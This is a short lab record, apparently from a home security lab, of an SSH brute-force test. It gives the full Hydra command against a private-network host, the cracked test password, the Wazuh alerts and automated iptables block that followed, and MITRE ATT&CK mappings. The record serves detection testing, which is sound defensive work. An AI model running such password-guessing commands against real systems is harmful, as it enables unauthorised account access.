# Attack: SSH Brute Force

## Tool Used
Hydra v9.6

## Command
hydra -l testuser -P passwords.txt 192.168.56.20 ssh -t 4 -V

## Result
- Password cracked: S3cur3T3st@2024
- Wazuh rule fired: 100001 (level 12), 100002 (level 15)
- ML Risk Score: 100.0 (HIGH)
- Automated response: iptables DROP 192.168.56.30

## MITRE ATT&CK
- T1110 — Brute Force
- T1078 — Valid Accounts
